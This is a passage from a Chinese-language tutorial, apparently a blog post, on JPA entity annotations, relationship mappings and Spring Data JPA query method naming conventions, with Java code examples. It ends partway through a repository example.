<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="comment">// ... id ...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column(name = &quot;user_name&quot;, nullable = false, length = 50, unique = true)</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column(length = 100)</span> <span class="comment">// 只指定长度</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果字段名和列名一致，且没有其他特殊约束，可以不加@Column注解</span></span><br><span class="line">    <span class="keyword">private</span> String email; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-1-4-其他常用注解"><a href="#3-1-4-其他常用注解" class="headerlink" title="3.1.4 其他常用注解"></a>3.1.4 其他常用注解</h4><ul>
<li><p><strong><code>@Transient</code></strong>:</p>
<ul>
<li><strong>作用</strong>: 标记在字段上，告诉JPA<strong>忽略这个字段</strong>，不要将它持久化到数据库中。</li>
<li><strong>场景</strong>: 用于存放一些临时的、计算得出的，或者不属于数据模型的字段。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transient</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> age; <span class="comment">// 假设age是根据生日计算得出的，不需要存入数据库</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>@Temporal</code></strong>:</p>
<ul>
<li><strong>作用</strong>: 用于修饰 <code>java.util.Date</code> 或 <code>java.util.Calendar</code> 类型的字段，指定它们在数据库中映射的类型。</li>
<li><strong>属性</strong>:<ul>
<li><code>TemporalType.DATE</code>: 只保留日期部分（映射到<code>DATE</code>类型）。</li>
<li><code>TemporalType.TIME</code>: 只保留时间部分（映射到<code>TIME</code>类型）。</li>
<li><code>TemporalType.TIMESTAMP</code>: 保留日期和时间（映射到<code>TIMESTAMP</code>类型）。</li>
</ul>
</li>
<li><strong>现代实践</strong>: <strong>强烈推荐使用 Java 8 的 <code>java.time</code> 包下的日期时间类型（<code>LocalDate</code>, <code>LocalTime</code>, <code>LocalDateTime</code>）</strong>。这些类型在JPA 2.2及以上版本中是原生支持的，<strong>不再需要</strong> <code>@Temporal</code> 注解，并且能更精确地映射到数据库类型。</li>
</ul>
</li>
<li><p><strong><code>@Enumerated</code></strong>:</p>
<ul>
<li><strong>作用</strong>: 用于映射<strong>枚举 (Enum)</strong> 类型字段。</li>
<li><strong>属性</strong>:<ul>
<li><strong><code>EnumType.ORDINAL</code> (默认值)</strong>: 将枚举的<strong>序数</strong>（从0开始的整数）存入数据库。<strong>这是一个危险的默认值！</strong> 因为如果你在枚举中间插入一个新的值，所有后续枚举的序数都会改变，导致数据错乱。</li>
<li><strong><code>EnumType.STRING</code> (推荐)</strong>: 将枚举的<strong>名称</strong>（字符串）存入数据库。这更具可读性，也更健壮。</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">UserStatus</span> &#123; ACTIVE, INACTIVE, BANNED; &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Enumerated(EnumType.STRING)</span> <span class="comment">// 强烈推荐使用STRING</span></span><br><span class="line"><span class="meta">@Column(length = 20)</span></span><br><span class="line"><span class="keyword">private</span> UserStatus status;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="3-2-关系映射"><a href="#3-2-关系映射" class="headerlink" title="3.2 关系映射"></a>3.2 关系映射</h3><p>在关系型数据库中，表与表之间的关系通常通过<strong>外键 (Foreign Key)</strong> 来维护。JPA通过一系列的关系映射注解，将这种数据库层面的关系，优雅地转换为了Java对象之间的<strong>引用 (Reference)</strong> 关系。</p>
<p>关系映射主要分为四种类型，根据实体间数量上的对应关系（“基数”）来定义：</p>
<ol>
<li><strong>一对一 (<code>@OneToOne</code>)</strong></li>
<li><strong>一对多 (<code>@OneToMany</code>)</strong></li>
<li><strong>多对一 (<code>@ManyToOne</code>)</strong></li>
<li><strong>多对多 (<code>@ManyToMany</code>)</strong></li>
</ol>
<hr>
<h4 id="3-2-1-通用概念：关系维护方与被维护方"><a href="#3-2-1-通用概念：关系维护方与被维护方" class="headerlink" title="3.2.1 通用概念：关系维护方与被维护方"></a>3.2.1 通用概念：关系维护方与被维护方</h4><p>在双向关系中（即两个实体都持有对方的引用），必须指定一个<strong>关系维护方 (Owning Side)</strong>。</p>
<ul>
<li><strong>关系维护方</strong>:<ul>
<li>通常是“多”的一方（在<code>@ManyToOne</code>中）或逻辑上的从属方。</li>
<li>这个实体对应的表中，会包含<strong>外键列</strong>。</li>
<li>在代码中，它使用 <code>@JoinColumn</code> 注解来定义外键。</li>
</ul>
</li>
<li><strong>关系被维护方 (Inverse Side)</strong>:<ul>
<li>它不拥有外键。</li>
<li>在代码中，它使用关系注解的 <code>mappedBy</code> 属性来声明：“这段关系由对方的那个字段来维护”。</li>
</ul>
</li>
</ul>
<p><strong>规则</strong>: <code>mappedBy</code> 属性总是出现在<strong>不包含外键</strong>的那一方。</p>
<hr>
<h4 id="3-2-2-多对一-ManyToOne-一对多-OneToMany"><a href="#3-2-2-多对一-ManyToOne-一对多-OneToMany" class="headerlink" title="3.2.2 多对一 (@ManyToOne) &amp; 一对多 (@OneToMany)"></a>3.2.2 多对一 (<code>@ManyToOne</code>) &amp; 一对多 (<code>@OneToMany</code>)</h4><p>这是最常见的一种关系，例如 <strong>用户(User)</strong> 和 <strong>订单(Order)</strong>。一个用户可以有多个订单，但一个订单只属于一个用户。</p>
<h5 id="1-定义关系"><a href="#1-定义关系" class="headerlink" title="1. 定义关系"></a>1. 定义关系</h5><ul>
<li><strong><code>Order</code> (多方 - Owning Side)</strong>:<ul>
<li>持有 <code>User</code> 的单个引用。</li>
<li>使用 <code>@ManyToOne</code> 注解。</li>
<li>使用 <code>@JoinColumn</code> 来定义外键列。</li>
</ul>
</li>
<li><strong><code>User</code> (一方 - Inverse Side)</strong>:<ul>
<li>持有 <code>Order</code> 的一个集合 (<code>Set</code> 或 <code>List</code>)。</li>
<li>使用 <code>@OneToMany</code> 注解。</li>
<li>使用 <code>mappedBy</code> 属性指向 <code>Order</code> 类中维护关系的字段名。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="2-示例代码"><a href="#2-示例代码" class="headerlink" title="2. 示例代码"></a>2. 示例代码</h5><p><strong><code>Order.java</code> (多方，关系维护方)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;orders&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Order</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String orderNumber;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ManyToOne(fetch = FetchType.LAZY)</span> <span class="comment">// 多对一关系，默认是EAGER加载</span></span><br><span class="line">    <span class="meta">@JoinColumn(name = &quot;user_id&quot;)</span> <span class="comment">// 定义外键列，名为 user_id</span></span><br><span class="line">    <span class="keyword">private</span> User user;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getters and Setters...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>User.java</code> (一方，关系被维护方)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一对多关系，默认是LAZY加载</span></span><br><span class="line">    <span class="comment">// mappedBy 的值是 Order 类中 &quot;user&quot; 字段的名称</span></span><br><span class="line">    <span class="meta">@OneToMany(mappedBy = &quot;user&quot;, cascade = CascadeType.ALL, orphanRemoval = true)</span></span><br><span class="line">    <span class="keyword">private</span> Set&lt;Order&gt; orders = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getters and Setters...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="3-关键注解与属性"><a href="#3-关键注解与属性" class="headerlink" title="3. 关键注解与属性"></a>3. 关键注解与属性</h5><ul>
<li><strong><code>@JoinColumn(name = &quot;...&quot;)</code></strong>:<ul>
<li>定义了在当前实体对应的表中，外键列的名称。</li>
</ul>
</li>
<li><strong><code>fetch</code> (加载策略)</strong>:<ul>
<li><code>FetchType.EAGER</code> (急切加载): 当查询主实体时，<strong>立即</strong>加载其关联的实体。</li>
<li><code>FetchType.LAZY</code> (懒加载): 当查询主实体时，<strong>不加载</strong>其关联的实体。只有当你<strong>第一次访问</strong>这个关联实体时，JPA才会发送额外的SQL去查询它。</li>
<li><strong>默认值</strong>:<ul>
<li><code>@ManyToOne</code> 和 <code>@OneToOne</code> 默认是 <strong><code>EAGER</code></strong>。</li>
<li><code>@OneToMany</code> 和 <code>@ManyToMany</code> 默认是 <strong><code>LAZY</code></strong>。</li>
</ul>
</li>
<li><strong>最佳实践</strong>: <strong>强烈建议将所有 <code>to-one</code> 关系（<code>@ManyToOne</code>, <code>@OneToOne</code>）手动设置为 <code>LAZY</code></strong>，以避免不必要的查询和N+1问题。只在确定每次都需要关联数据时才使用 <code>EAGER</code>。</li>
</ul>
</li>
<li><strong><code>cascade</code> (级联操作)</strong>:<ul>
<li>定义了对主实体的操作如何<strong>传播</strong>到关联实体。</li>
<li><code>CascadeType.ALL</code>: 所有操作（<code>PERSIST</code>, <code>MERGE</code>, <code>REMOVE</code>, <code>REFRESH</code>, <code>DETACH</code>）都级联。</li>
<li><code>CascadeType.PERSIST</code>: 级联保存（当你保存<code>User</code>时，会自动保存其<code>orders</code>集合中的新订单）。</li>
<li><code>CascadeType.REMOVE</code>: 级联删除（当你删除<code>User</code>时，会自动删除其所有订单）。</li>
<li><strong>使用场景</strong>: 通常在父子关系（如<code>User</code>与<code>Order</code>）中，在“一”的一方使用 <code>cascade = CascadeType.ALL</code>，可以简化代码。</li>
</ul>
</li>
<li><strong><code>orphanRemoval = true</code> (孤儿移除)</strong>:<ul>
<li>与 <code>cascade</code> 配合使用，通常在 <code>@OneToMany</code> 中。</li>
<li>当一个子实体（<code>Order</code>）从父实体（<code>User</code>）的集合中被<strong>移除</strong>时（例如 <code>user.getOrders().remove(someOrder)</code>），这个子实体会被自动从数据库中<strong>删除</strong>。它就像一个“孤儿”，失去了与父级的关联，所以被清理掉。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="3-2-3-一对一-OneToOne"><a href="#3-2-3-一对一-OneToOne" class="headerlink" title="3.2.3 一对一 (@OneToOne)"></a>3.2.3 一对一 (<code>@OneToOne</code>)</h4><p>例如，<strong>用户(User)</strong> 和 <strong>用户资料(UserProfile)</strong>。一个用户只有一个资料，一个资料也只属于一个用户。</p>
<p>实现方式有两种：共享主键（不推荐）和<strong>唯一外键</strong>。</p>
<p><strong>示例：使用唯一外键</strong></p>
<p><strong><code>UserProfile.java</code> (关系维护方)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProfile</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="keyword">private</span> Long id; <span class="comment">// 主键</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String bio;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@OneToOne(fetch = FetchType.LAZY)</span></span><br><span class="line">    <span class="meta">@MapsId</span> <span class="comment">// 关键：将外键 user_id 同时作为本实体的主键</span></span><br><span class="line">    <span class="meta">@JoinColumn(name = &quot;user_id&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> User user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>User.java</code> (关系被维护方)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// orphanRemoval=true 确保删除User时，UserProfile也被删除</span></span><br><span class="line">    <span class="meta">@OneToOne(mappedBy = &quot;user&quot;, cascade = CascadeType.ALL, fetch = FetchType.LAZY, orphanRemoval = true)</span></span><br><span class="line">    <span class="keyword">private</span> UserProfile userProfile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>@MapsId</code>: 这是一个非常巧妙的注解。它告诉JPA，<code>UserProfile</code> 的主键(<code>id</code>)的值，直接来源于关联的<code>User</code>对象的主键。这保证了<code>user_id</code>既是外键，又是主键，从而在数据库层面实现了严格的一对一关系。</li>
</ul>
<hr>
<h4 id="3-2-4-多对多-ManyToMany"><a href="#3-2-4-多对多-ManyToMany" class="headerlink" title="3.2.4 多对多 (@ManyToMany)"></a>3.2.4 多对多 (<code>@ManyToMany</code>)</h4><p>例如，<strong>文章(Post)</strong> 和 <strong>标签(Tag)</strong>。一篇文章可以有多个标签，一个标签也可以用于多篇文章。</p>
<p>在数据库中，多对多关系必须通过一个<strong>中间表 (Join Table &#x2F; Link Table)</strong> 来实现。</p>
<h5 id="1-示例代码"><a href="#1-示例代码" class="headerlink" title="1. 示例代码"></a>1. 示例代码</h5><p><strong><code>Post.java</code> (关系的一方)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Post</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span> <span class="meta">@GeneratedValue</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ManyToMany(cascade = &#123; CascadeType.PERSIST, CascadeType.MERGE &#125;)</span></span><br><span class="line">    <span class="meta">@JoinTable(</span></span><br><span class="line"><span class="meta">        name = &quot;post_tag&quot;, // 中间表的名字</span></span><br><span class="line"><span class="meta">        joinColumns = @JoinColumn(name = &quot;post_id&quot;), // 中间表中，指向本实体(Post)的外键列</span></span><br><span class="line"><span class="meta">        inverseJoinColumns = @JoinColumn(name = &quot;tag_id&quot;) // 中间表中，指向另一方实体(Tag)的外键列</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="keyword">private</span> Set&lt;Tag&gt; tags = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>Tag.java</code> (关系的另一方)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tag</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span> <span class="meta">@GeneratedValue</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ManyToMany(mappedBy = &quot;tags&quot;)</span> <span class="comment">// 由Post方的&quot;tags&quot;字段维护关系</span></span><br><span class="line">    <span class="keyword">private</span> Set&lt;Post&gt; posts = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-关键注解"><a href="#2-关键注解" class="headerlink" title="2. 关键注解"></a>2. 关键注解</h5><ul>
<li><strong><code>@JoinTable</code></strong>:<ul>
<li>用于在<strong>关系维护方</strong>定义中间表的细节。</li>
<li><code>name</code>: 中间表的名称。</li>
<li><code>joinColumns</code>: 定义了中间表中与<strong>当前实体</strong>相关联的外键。</li>
<li><code>inverseJoinColumns</code>: 定义了中间表中与<strong>另一方实体</strong>相关联的外键。</li>
</ul>
</li>
</ul>
<p><strong>多对多关系的警告</strong>:<br>虽然JPA的<code>@ManyToMany</code>用起来很方便，但在实际项目中，中间表往往不只是包含两个外键，可能还需要包含额外的属性（如<code>创建时间</code>、<code>排序字段</code>等）。在这种情况下，<strong>最佳实践</strong>是<strong>将多对多关系拆分为两个一对多关系</strong>，即创建一个代表中间表的<strong>新实体</strong>（如<code>PostTag</code>），然后建立 <code>Post -&gt; PostTag</code> 和 <code>Tag -&gt; PostTag</code> 的两个一对多关系。</p>
<hr>
<h3 id="3-3-查询方式"><a href="#3-3-查询方式" class="headerlink" title="3.3 查询方式"></a>3.3 查询方式</h3><h4 id="3-3-1-方法命名查询-Query-Methods"><a href="#3-3-1-方法命名查询-Query-Methods" class="headerlink" title="3.3.1 方法命名查询 (Query Methods)"></a>3.3.1 方法命名查询 (Query Methods)</h4><h5 id="1-核心理念"><a href="#1-核心理念" class="headerlink" title="1. 核心理念"></a>1. 核心理念</h5><p>方法命名查询的核心理念是：<strong>你不再需要编写JPQL或SQL语句，只需要在你的Repository接口中，按照Spring Data预先定义好的一套命名约定来声明一个方法，Spring Data框架就会在运行时自动为你解析这个方法名，并生成对应的查询语句来执行。</strong></p>
<p>这就像你和Spring Data之间有了一个“暗号”。你说出暗号（方法名），它就能理解你的查询意图。</p>
<hr>
<h5 id="2-工作原理"><a href="#2-工作原理" class="headerlink" title="2. 工作原理"></a>2. 工作原理</h5><ol>
<li><strong>接口定义</strong>: 你在继承了<code>JpaRepository</code>的接口中定义一个新方法，例如 <code>findByUsername(String username)</code>。</li>
<li><strong>应用启动</strong>: Spring Boot在启动并扫描到你的Repository接口时，Spring Data框架会介入。</li>
<li><strong>方法名解析</strong>: 它会获取到你定义的所有方法，并尝试解析那些没有具体实现的方法名。</li>
<li><strong>查询生成</strong>: 它会根据一套严格的语法规则来“拆解”方法名，例如：<ul>
<li><code>find</code>…<code>By</code>…: 识别出查询的前缀和分隔符。</li>
<li><code>Username</code>: 将其解析为实体类<code>User</code>的一个属性<code>username</code>。</li>
<li><code>String username</code>: 识别出方法的参数，并将其与属性<code>username</code>对应。</li>
</ul>
</li>
<li><strong>代理实现</strong>: 最后，它会为这个方法动态地生成一个实现，该实现内部包含了执行 <code>SELECT u FROM User u WHERE u.username = ?1</code> 这样的JPQL查询的逻辑。</li>
</ol>
<p>当你的Service层调用<code>userRepository.findByUsername(&quot;alice&quot;)</code>时，实际上是调用了这个动态生成的代理实现。</p>
<hr>
<h5 id="3-命名约定语法"><a href="#3-命名约定语法" class="headerlink" title="3. 命名约定语法"></a>3. 命名约定语法</h5><p>方法名的结构通常如下：<code>[前缀][关键词][(属性名 + 条件)]...[排序子句]</code></p>
<h6 id="a-查询前缀-Prefix"><a href="#a-查询前缀-Prefix" class="headerlink" title="a. 查询前缀 (Prefix)"></a>a. 查询前缀 (Prefix)</h6><table>
<thead>
<tr>
<th align="left">前缀</th>
<th align="left">描述</th>
<th align="left">返回类型示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>find...By...</code></td>
<td align="left">最常用的查询前缀。</td>
<td align="left"><code>User</code>, <code>List&lt;User&gt;</code></td>
</tr>
<tr>
<td align="left"><code>read...By...</code></td>
<td align="left">功能与<code>find</code>完全相同，语义上表示读取。</td>
<td align="left"><code>User</code>, <code>List&lt;User&gt;</code></td>
</tr>
<tr>
<td align="left"><code>query...By...</code></td>
<td align="left">功能与<code>find</code>完全相同。</td>
<td align="left"><code>User</code>, <code>List&lt;User&gt;</code></td>
</tr>
<tr>
<td align="left"><code>get...By...</code></td>
<td align="left">功能与<code>find</code>完全相同。</td>
<td align="left"><code>User</code>, <code>List&lt;User&gt;</code></td>
</tr>
<tr>
<td align="left"><code>count...By...</code></td>
<td align="left">查询符合条件的记录<strong>总数</strong>。</td>
<td align="left"><code>long</code>, <code>int</code></td>
</tr>
<tr>
<td align="left"><code>exists...By...</code></td>
<td align="left">判断是否存在符合条件的记录。</td>
<td align="left"><code>boolean</code></td>
</tr>
<tr>
<td align="left"><code>delete...By...</code> *</td>
<td align="left">删除符合条件的记录。需要事务支持 (<code>@Transactional</code>)。</td>
<td align="left"><code>long</code> (删除的行数)</td>
</tr>
<tr>
<td align="left"><code>remove...By...</code> *</td>
<td align="left">功能与<code>delete</code>相同。</td>
<td align="left"><code>long</code> (删除的行数)</td>
</tr>
</tbody></table>
<p><em>注意: <code>delete</code>和<code>remove</code>前缀返回的是被删除的记录数或记录列表，具体取决于返回类型定义。</em></p>
<hr>
<h6 id="b-属性表达式与条件关键词"><a href="#b-属性表达式与条件关键词" class="headerlink" title="b. 属性表达式与条件关键词"></a>b. 属性表达式与条件关键词</h6><p><code>By</code>之后的部分是查询的<strong>条件</strong>，由<strong>实体属性名</strong>和<strong>条件关键词</strong>组成。</p>
<ul>
<li><strong>属性名</strong>: 必须与你的实体类中的<strong>字段名完全匹配</strong>（首字母大写）。支持<strong>嵌套属性</strong>，通过 <code>_</code> 或直接驼峰连接，例如 <code>findByAddressCity(String city)</code> 对应 <code>address.city</code>。</li>
<li><strong>条件关键词 (Keywords)</strong>:</li>
</ul>
<table>
<thead>
<tr>
<th align="left">关键词</th>
<th align="left">JPQL&#x2F;SQL 等价物</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>And</code></td>
<td align="left"><code>AND</code></td>
<td align="left"><code>findByUsernameAndEmail(String name, String email)</code></td>
</tr>
<tr>
<td align="left"><code>Or</code></td>
<td align="left"><code>OR</code></td>
<td align="left"><code>findByUsernameOrEmail(String name, String email)</code></td>
</tr>
<tr>
<td align="left"><code>Is</code>, <code>Equals</code></td>
<td align="left"><code>=</code></td>
<td align="left"><code>findByUsername(&quot;alice&quot;)</code>, <code>findByUsernameIs(&quot;alice&quot;)</code></td>
</tr>
<tr>
<td align="left"><code>IsNot</code>, <code>Not</code></td>
<td align="left"><code>!=</code> or <code>&lt;&gt;</code></td>
<td align="left"><code>findByUsernameIsNot(&quot;admin&quot;)</code></td>
</tr>
<tr>
<td align="left"><code>IsNull</code>, <code>IsNotNull</code></td>
<td align="left"><code>IS NULL</code>, <code>IS NOT NULL</code></td>
<td align="left"><code>findByAddressIsNull()</code></td>
</tr>
<tr>
<td align="left"><code>IsTrue</code>, <code>IsFalse</code></td>
<td align="left"><code>= true</code>, <code>= false</code></td>
<td align="left"><code>findByActiveIsTrue()</code></td>
</tr>
<tr>
<td align="left"><code>Like</code>, <code>NotLike</code></td>
<td align="left"><code>LIKE</code>, <code>NOT LIKE</code></td>
<td align="left"><code>findByNameLike(&quot;%a%&quot;)</code></td>
</tr>
<tr>
<td align="left"><code>StartingWith</code></td>
<td align="left"><code>LIKE &#39;prefix%&#39;</code></td>
<td align="left"><code>findByNameStartingWith(&quot;A&quot;)</code></td>
</tr>
<tr>
<td align="left"><code>EndingWith</code></td>
<td align="left"><code>LIKE &#39;%suffix&#39;</code></td>
<td align="left"><code>findByNameEndingWith(&quot;ce&quot;)</code></td>
</tr>
<tr>
<td align="left"><code>Containing</code></td>
<td align="left"><code>LIKE &#39;%infix%&#39;</code></td>
<td align="left"><code>findByNameContaining(&quot;li&quot;)</code></td>
</tr>
<tr>
<td align="left"><code>GreaterThan</code></td>
<td align="left"><code>&gt;</code></td>
<td align="left"><code>findByAgeGreaterThan(18)</code></td>
</tr>
<tr>
<td align="left"><code>GreaterThanEqual</code></td>
<td align="left"><code>&gt;=</code></td>
<td align="left"><code>findByAgeGreaterThanEqual(18)</code></td>
</tr>
<tr>
<td align="left"><code>LessThan</code></td>
<td align="left"><code>&lt;</code></td>
<td align="left"><code>findByAgeLessThan(60)</code></td>
</tr>
<tr>
<td align="left"><code>LessThanEqual</code></td>
<td align="left"><code>&lt;=</code></td>
<td align="left"><code>findByAgeLessThanEqual(60)</code></td>
</tr>
<tr>
<td align="left"><code>Between</code></td>
<td align="left"><code>BETWEEN</code></td>
<td align="left"><code>findByAgeBetween(18, 30)</code> (接收两个参数)</td>
</tr>
<tr>
<td align="left"><code>In</code>, <code>NotIn</code></td>
<td align="left"><code>IN</code>, <code>NOT IN</code></td>
<td align="left"><code>findByStatusIn(List&lt;Status&gt; statuses)</code> (接收集合参数)</td>
</tr>
<tr>
<td align="left"><code>IgnoreCase</code></td>
<td align="left">(会转换值为小写&#x2F;大写进行比较)</td>
<td align="left"><code>findByUsernameIgnoreCase(&quot;ALICE&quot;)</code></td>
</tr>
</tbody></table>
<hr>
<h6 id="c-排序与限制结果"><a href="#c-排序与限制结果" class="headerlink" title="c. 排序与限制结果"></a>c. 排序与限制结果</h6><ul>
<li><strong>排序 (<code>OrderBy</code>)</strong>:<ul>
<li>在方法名末尾使用 <code>OrderBy</code> 子句，后跟属性名和排序方向 (<code>Asc</code> 或 <code>Desc</code>)。</li>
<li><code>findByStatusOrderByUsernameAsc(String status)</code></li>
<li><code>findByStatusOrderByCreateTimeDesc(String status)</code></li>
</ul>
</li>
<li><strong>限制结果数量 (<code>Top</code>, <code>First</code>)</strong>:<ul>
<li>在查询前缀后，<code>By</code>之前，可以加上 <code>Top&lt;N&gt;</code> 或 <code>First&lt;N&gt;</code> 来限制返回结果的数量。</li>
<li><code>findTop10ByOrderByCreateTimeDesc()</code>: 查询最新的10条记录。</li>
<li><code>findFirstByStatus(String status)</code>: 只返回符合条件的第一条记录。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="4-综合示例"><a href="#4-综合示例" class="headerlink" title="4. 综合示例"></a>4. 综合示例</h5><p>假设有一个 <code>User</code> 实体，包含 <code>username</code>, <code>email</code>, <code>status</code> (Enum), <code>age</code>, <code>createTime</code> 字段。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title 